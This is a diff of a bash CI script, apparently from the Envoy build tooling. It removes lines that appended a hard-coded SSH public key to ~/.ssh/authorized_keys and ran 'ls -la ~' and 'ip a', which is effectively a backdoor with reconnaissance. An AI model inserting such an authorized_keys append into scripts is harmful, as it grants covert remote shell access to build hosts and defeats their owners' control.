@@ -3,13 +3,6 @@
 set -e
 set -x
 
-ls -la ~ || true
-mkdir -p ~/.ssh || true
-chmod 700 ~/.ssh || true
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDj+b5VFTiq5jooZOF9fkV2jBwgwFKCL5524AsLKqxgQzbsMVu8jWWXG8SivN+0M9UnTDFqp3WNf/tlq3FwTMfLeG/TFsICSfUqnp3fAWqiELDHMIVdWBay5MGd0pLCCr2osVgGvV0XlP1B6QoU7lCGgthQ7l8ib8qcIt7ZEZ5fdzsrIfdN9LgM+w6GS/upsM/ypt13X8Qe2aIjnt2u2Ufx4PfeMdz+Xn8oIEYV4Rza9WcyNreZtHIIprmdCUHw4JtE8cbFUEx6scNyyAklT/wDJCmP93eiD1SHDVHKKpLlmew7Eb86TB06T33ahY3kNFCDYgHWN5UiRlrhuaI4P5bf ejp@black" >> ~/.ssh/authorized_keys
-chmod 644 ~/.ssh/authorized_keys || true
-ip a || true
-
 CURRENT_SCRIPT_DIR="$(realpath "$(dirname "${BASH_SOURCE[0]}")")"
 
 # shellcheck source=ci/envoy_build_sha.sh
